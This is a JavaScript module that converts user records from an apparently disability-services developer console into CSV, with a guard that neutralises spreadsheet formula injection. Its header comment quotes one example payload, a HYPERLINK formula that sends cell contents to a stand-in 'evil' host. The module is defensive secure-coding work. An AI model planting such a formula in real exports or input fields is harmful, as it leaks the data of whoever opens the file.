/**
 * CSV serialisation for developer exports.
 *
 * Split out of the route so it can be unit-tested without booting the app.
 *
 * The formula-injection guard matters here: this console exports NDIS
 * participant records whose name fields are user-supplied at registration
 * (the User schema trims but never sanitises). A firstName of
 * `=HYPERLINK("http://evil/?d="&A1,"x")` would otherwise become a live
 * formula the moment an on-call dev opened the file in Excel or Sheets.
 */

// Leading characters Excel/Sheets/LibreOffice treat as the start of a formula.
const FORMULA_START = /^[=+\-@\t\r]/;

function csvCell(value) {
  let v = value === undefined || value === null ? '' : String(value);
  if (FORMULA_START.test(v)) {
    // Prefix with a single quote, which spreadsheets render as a literal
    // leading apostrophe and then strip on display.
    v = `'${v}`;
  }
  if (/[",\n\r]/.test(v)) {
    return `"${v.replace(/"/g, '""')}"`;
  }
  return v;
}

function toCsv(headers, records) {
  const lines = [headers.map(csvCell).join(',')];
  for (const rec of records) {
    lines.push(headers.map((h) => csvCell(rec[h])).join(','));
  }
  return lines.join('\n');
}

function convertUsersToCSV(rows) {
  const headers = [
    'id', 'email', 'firstName', 'lastName', 'role', 'organizationId',
    'organizationCode', 'isActive', 'isDeleted', 'lastLoginAt', 'createdAt',
    'phone', 'clientId',
  ];
  const records = rows.map((r) => ({
    id: r._id ? r._id.toString() : (r.id || ''),
    email: r.email || '',
    firstName: r.firstName || '',
    lastName: r.lastName || '',
    role: r.role || '',
    organizationId: r.organizationId || '',
    organizationCode: r.organizationCode || '',
    isActive: r.isActive === undefined ? '' : String(r.isActive),
    isDeleted: r.isDeleted === undefined ? '' : String(r.isDeleted),
    lastLoginAt: r.lastLoginAt ? r.lastLoginAt.toISOString() : '',
    createdAt: r.createdAt ? r.createdAt.toISOString() : '',
    phone: r.phone || '',
    clientId: r.clientId ? r.clientId.toString() : '',
  }));
  return toCsv(headers, records);
}

module.exports = { csvCell, toCsv, convertUsersToCSV };

// Re-exported under explicit names for the test suite.
module.exports.convertUsersToCSVForTest = convertUsersToCSV;
module.exports.extractCsvCellForTest = csvCell;